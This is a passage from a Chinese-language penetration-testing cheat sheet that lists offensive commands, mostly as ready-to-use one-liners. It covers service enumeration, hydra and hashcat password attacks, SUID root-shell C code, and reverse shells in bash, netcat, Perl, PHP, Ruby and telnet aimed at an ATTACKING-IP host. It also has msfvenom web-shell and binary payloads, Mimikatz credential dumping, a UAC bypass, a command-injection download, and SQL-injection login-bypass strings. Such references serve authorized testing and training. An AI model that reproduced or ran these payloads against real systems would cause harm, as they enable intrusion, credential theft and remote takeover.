highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.1.1/<br><br>nikto -h 192.168.1.1<br></code></pre></td></tr></table></figure><h3 id="Pop3-110"><a href="#Pop3-110" class="headerlink" title="Pop3 (110)"></a>Pop3 (110)</h3><p>telnet [ip] 110</p><p>USER [username]</p><p>PASS [password]</p><p>列出信息<br><code>LIST</code></p><p>查找邮件<br><code>RETR [message number]</code></p><h3 id="RPCBind-111"><a href="#RPCBind-111" class="headerlink" title="RPCBind (111)"></a>RPCBind (111)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcinfo –p 192.168.1.1<br></code></pre></td></tr></table></figure><h3 id="SMB-RPC-139-445"><a href="#SMB-RPC-139-445" class="headerlink" title="SMB\RPC (139/445)"></a>SMB\RPC (139/445)</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bahs">enum4linux –a 192.168.1.1<br></code></pre></td></tr></table></figure><p>枚举子网上的Windows/Samba服务器，查找Windows MAC地址，netbios名称并发现客户端工作组/域</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nbtscan 192.168.1.1<br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.1.1<br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse<br></code></pre></td></tr></table></figure><p>列出Ipc共享</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //192.168.1.X/<br><br>smbclient //192.168.1.X/ipc$ -U user<br></code></pre></td></tr></table></figure><h3 id="SNMP-161"><a href="#SNMP-161" class="headerlink" title="SNMP (161)"></a>SNMP (161)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 10.0.0.0<br><br>snmpcheck -t 192.168.1.X -c public<br><br>onesixtyone -c names -i hosts<br><br>nmap -sT -p 161 192.168.X.X -oG snmp_results.txt<br><br>snmpenum -t 192.168.1.X<br></code></pre></td></tr></table></figure><h3 id="Oracle-1521"><a href="#Oracle-1521" class="headerlink" title="Oracle (1521)"></a>Oracle (1521)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">tnscmd10g version -h 192.168.X.X<br><br>tnscmd10g status -h 192.168.X.X<br></code></pre></td></tr></table></figure><h3 id="Mysql-3306"><a href="#Mysql-3306" class="headerlink" title="Mysql (3306)"></a>Mysql (3306)</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -Pn -vv  192.168.1.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122<br></code></pre></td></tr></table></figure><h3 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nslookup -&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span>=any -&gt; ls -d baidu.com<br><br>dig axfr baidu.com @ns1.baidu.com<br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml<br></code></pre></td></tr></table></figure><h3 id="挂载文件共享"><a href="#挂载文件共享" class="headerlink" title="挂载文件共享"></a>挂载文件共享</h3><p><code>showmount -e</code></p><p>将共享挂载到/ mnt / nfs而不锁定它</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount 192.168.1.1:/vol/share /mnt/nfs  -nolock<br></code></pre></td></tr></table></figure><p>在Linux上挂载Windows CIFS/SMB共享位于/mnt/cifs如果删除密码，它将在CLI上提示</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -tcifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs<br></code></pre></td></tr></table></figure><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>通过显示横幅进行基本版本控制/指纹识别</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -v 192.168.1.1 25<br><br>telnet 192.168.1.1 25<br></code></pre></td></tr></table></figure><h3 id="搜索利用exp"><a href="#搜索利用exp" class="headerlink" title="搜索利用exp"></a>搜索利用exp</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit windows 2003 | grep -i <span class="hljs-built_in">local</span><br></code></pre></td></tr></table></figure><h3 id="编译EXP"><a href="#编译EXP" class="headerlink" title="编译EXP"></a>编译EXP</h3><p>编译C代码，在’gcc’之后添加<code>-m32</code>，用于在64位Linux上编译32位代码,不添加则编译64位的exp</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -o exploit exploit.c<br></code></pre></td></tr></table></figure><p>在Linux上编译windows .exe</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe<br></code></pre></td></tr></table></figure><h3 id="检测数据包"><a href="#检测数据包" class="headerlink" title="检测数据包"></a>检测数据包</h3><p>tcpdump用于接口eth0上的端口80，输出到output.pcap</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump tcp port 80 -w output.pcap -i eth0<br></code></pre></td></tr></table></figure><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">hash</span>-identifier [<span class="hljs-built_in">hash</span>]<br><br>john hashes.txt<br><br>hashcat -m 500 -a 0 -o output.txt –remove hashes.txt /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href="https://hashkiller.co.uk/" target="_blank" rel="noopener">https://hashkiller.co.uk/</a></p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>web post表单</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra 10.0.0.1 http-post-form “/admin.php:target=auth&amp;mode=login&amp;user=^USER^&amp;password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin<br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt [ip] [协议]<br></code></pre></td></tr></table></figure><p>爆破SMTP</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp –V<br></code></pre></td></tr></table></figure><h2 id="Shells-amp-Reverse-Shells"><a href="#Shells-amp-Reverse-Shells" class="headerlink" title="Shells &amp; Reverse Shells"></a><center>Shells &amp; Reverse Shells</center></h2><h3 id="SUID-C-Shells"><a href="#SUID-C-Shells" class="headerlink" title="SUID C Shells"></a>SUID C Shells</h3><p><strong>/bin/bash</strong></p><figure class="hljs highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>system(<span class="hljs-string">"/bin/bash"</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>/bin/sh</strong></p><figure class="hljs highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>system(<span class="hljs-string">"/bin/sh"</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="TTY-Shell"><a href="#TTY-Shell" class="headerlink" title="TTY Shell"></a>TTY Shell</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span><br><br><span class="hljs-built_in">echo</span> os.system(<span class="hljs-string">'/bin/bash'</span>)<br><br>/bin/sh –i<br><br>execute(<span class="hljs-string">'/bin/sh'</span>)<br><br>!sh <span class="hljs-comment">#nmap</span><br><br><span class="hljs-string">"!bash #vi</span><br></code></pre></td></tr></table></figure><h3 id="Spawn-Ruby-Shell"><a href="#Spawn-Ruby-Shell" class="headerlink" title="Spawn Ruby Shell"></a>Spawn Ruby Shell</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> <span class="hljs-string">"/bin/sh"</span><br><br>ruby -rsocket -e<span class="hljs-string">'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d</span><br></code></pre></td></tr></table></figure><h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs `bash">nc -e &#x2F;bin&#x2F;sh ATTACKING-IP 80<br><br>&#x2F;bin&#x2F;sh | nc ATTACKING-IP 80<br><br>rm -f &#x2F;tmp&#x2F;p; mknod &#x2F;tmp&#x2F;p p &amp;&amp; nc ATTACKING-IP 4444 0&#x2F;tmp&#x2F;p<br></code></pre></td></tr></table></figure><h3 id="telnet反弹Shell"><a href="#telnet反弹Shell" class="headerlink" title="telnet反弹Shell"></a>telnet反弹Shell</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p<br><br>telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443<br></code></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>假设TCP使用文件描述符3.如果它不起作用，请尝试4,5或6）</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">'$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></code></pre></td></tr></table></figure><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> /bin/bash 0&amp;0 2&gt;&amp;0<br><br>0&lt;&amp;196;<span class="hljs-built_in">exec</span> 196&lt;&gt;/dev/tcp/ATTACKING-IP/80; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br><br><span class="hljs-built_in">exec</span> 5&lt;&gt;/dev/tcp/ATTACKING-IP/80 cat &lt;&amp;5 | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="hljs-keyword">done</span><br><br>bash -i &gt;&amp; /dev/tcp/ATTACKING-IP/80 0&gt;&amp;1<br></code></pre></td></tr></table></figure><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> <span class="hljs-string">"/bin/sh"</span>;<br><br>perl —e <span class="hljs-string">'exec "/bin/sh";'</span><br><br>perl -e <span class="hljs-string">'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br><br>perl -MIO -e <span class="hljs-string">'$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span><br><br>perl -e <span class="hljs-string">'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></code></pre></td></tr></table></figure><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a><center>Meterpreter</center></h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><h3 id="Windows-VNV"><a href="#Windows-VNV" class="headerlink" title="Windows VNV"></a>Windows VNV</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/vncinject/reverse_tcp<br><br><span class="hljs-built_in">set</span> ViewOnly <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload linux/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><h3 id="msf备忘"><a href="#msf备忘" class="headerlink" title="msf备忘"></a>msf备忘</h3><p>上传文件</p><p><code>upload file c:\\windows</code></p><p>下载文件</p><p><code>download c:\\windows\\repair\\sam /tmp</code></p><p>运行exe</p><p><code>execute -f c:\\windows\temp\exploit.exe</code></p><p>使用cmd shell创建新通道</p><p><code>execute -f cmd -c</code></p><p>端口转发</p><p><code>portfwd add –l 3389 –p 3389 –r target</code></p><p>关闭端口转发</p><p><code>portfwd delete –l 3389 –p 3389 –r target</code></p><p>Bypass UAC</p><p><code>use exploit/windows/local/bypassuac</code></p><p>HTTP目录扫描</p><p><code>use auxiliary/scanner/http/dir_scanner</code></p><p>扫描JBOSS漏洞</p><p><code>use auxiliary/scanner/http/jboss_vulnscan</code></p><p>扫描MSSQL密码</p><p><code>use auxiliary/scanner/mssql/mssql_login</code></p><p>扫描MSSQL版本</p><p><code>use auxiliary/scanner/mysql/mysql_version</code></p><p>Oracle登录模块</p><p><code>use auxiliary/scanner/oracle/oracle_login</code></p><p>powershell有效负载模块</p><p><code>use exploit/multi/script/web_delivery</code></p><p>通过会话上传和运行powershell脚本</p><p><code>post/windows/manage/powershell/exec_powershell</code></p><p>部署JBOSS</p><p><code>use exploit/multi/http/jboss_maindeployer</code></p><p>MSSQL有效负载</p><p><code>use exploit/windows/mssql/mssql_payload</code></p><p>显示当前用户的权限</p><p><code>run post/windows/gather/win_privs</code></p><p>抓取GPP保存的密码</p><p><code>use post/windows/gather/credentials/gpp</code></p><p>加载Mimikatz/kiwi并获得凭证</p><p><code>load kiwi</code></p><p><code>creds_all</code></p><p>识别所提供的域用户具有管理访问权限的其他计算机</p><p><code>run post/windows/gather/local_admin_search_enum</code></p><p><code>set AUTORUNSCRIPT post/windows/manage/migrate</code></p><h3 id="msf-payloads"><a href="#msf-payloads" class="headerlink" title="msf payloads"></a>msf payloads</h3><p>列出选项</p><p><code>msfvenom –l</code></p><h3 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf<br><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe<br><br>msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho<br></code></pre></td></tr></table></figure><h3 id="Web-payloads"><a href="#Web-payloads" class="headerlink" title="Web payloads"></a>Web payloads</h3><p>PHP</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw &gt; shell.php<br><br>cat shell.php | pbcopy &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php '</span> | tr -d <span class="hljs-string">'\n'</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br></code></pre></td></tr></table></figure><p>监听</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>ASP</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp<br></code></pre></td></tr></table></figure><p>JSP</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp<br></code></pre></td></tr></table></figure><p>WAR</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war<br></code></pre></td></tr></table></figure><h3 id="脚本-payloads"><a href="#脚本-payloads" class="headerlink" title="脚本 payloads"></a>脚本 payloads</h3><p>Python</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py<br></code></pre></td></tr></table></figure><p>Bash</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh<br></code></pre></td></tr></table></figure><p>Perl</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl<br></code></pre></td></tr></table></figure><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f<br><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f<br><br>msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f<br></code></pre></td></tr></table></figure><h3 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a>Handlers</h3><p>msf常用</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/multi/handler<br><br><span class="hljs-built_in">set</span> PAYLOAD<br><br><span class="hljs-built_in">set</span> LHOST<br><br><span class="hljs-built_in">set</span> LPORT<br><br><span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br><br>exploit -j -z<br></code></pre></td></tr></table></figure><p><strong>Demo</strong></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f &gt; exploit.extension<br></code></pre></td></tr></table></figure><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a><center>Powershell</center></h2><p>执行旁路</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Set-ExecutionPolicy Unrestricted<br>./file.ps1<br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module script.psm1<br>Invoke-FunctionThatIsIntheModule<br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iex(new-object system.net.webclient).downloadstring(“file:///C:\examplefile.ps1”)<br></code></pre></td></tr></table></figure><p>Powershell.exe被阻止</p><p>Use ‘not powershell’ <a href="https://github.com/Ben0xA/nps" target="_blank" rel="noopener">https://github.com/Ben0xA/nps</a></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a><center>提权</center></h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p><p><a href="https://github.com/pentestmonkey/unix-privesc-check" target="_blank" rel="noopener">https://github.com/pentestmonkey/unix-privesc-check</a></p><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><p><a href="https://github.com/pentestmonkey/windows-privesc-check" target="_blank" rel="noopener">https://github.com/pentestmonkey/windows-privesc-check</a></p><p><a href="http://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">http://www.fuzzysecurity.com/tutorials/16.html</a></p><p><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/" target="_blank" rel="noopener">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></p><h2 id="命令行注入"><a href="#命令行注入" class="headerlink" title="命令行注入"></a><center>命令行注入</center></h2><h3 id="遍历文件"><a href="#遍历文件" class="headerlink" title="遍历文件"></a>遍历文件</h3><p><code>website.com/file.php[?path=/]</code></p><h3 id="使用curl探测HTTP-options"><a href="#使用curl探测HTTP-options" class="headerlink" title="使用curl探测HTTP options"></a>使用curl探测HTTP options</h3><p><code>curl -vX OPTIONS [website]</code></p><h3 id="使用CURL将文件上传到具有PUT方法的网站"><a href="#使用CURL将文件上传到具有PUT方法的网站" class="headerlink" title="使用CURL将文件上传到具有PUT方法的网站"></a>使用CURL将文件上传到具有PUT方法的网站</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --upload-file shell.php --url http://192.168.218.139/<span class="hljs-built_in">test</span>/shell.php --http1.0<br></code></pre></td></tr></table></figure><h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?path=/;wget http://IPADDRESS:8000/FILENAME.EXTENTION;<br></code></pre></td></tr></table></figure><h3 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">;php -f filelocation.php<br></code></pre></td></tr></table></figure><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><center>SQL注入</center></h2><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>登录表单的常见注入:</p><ul><li>admin’ –</li><li>admin’ #</li><li>admin’/*</li><li>‘ or 1=1–</li><li>‘ or 1=1#</li><li>‘ or 1=1/*</li><li>‘) or ‘1’=’1–</li><li>‘) or (‘1’=’1—</li></ul><h3 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h3><p>自动sqlmap扫描</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://demo.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3<br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3<br></code></pre></td></tr></table></figure><p>有针对性的sqlmap扫描</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read=<span class="hljs-string">"/var/www/blah.php"</span><br></code></pre></td></tr></table></figure><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">"http://meh.com/meh.php?id=1"</span> --dbms=mysql --tech=U --random-agent --dump Scan url <span class="hljs-keyword">for</span> union + error based injection with mysql backend and use a random user agent + database 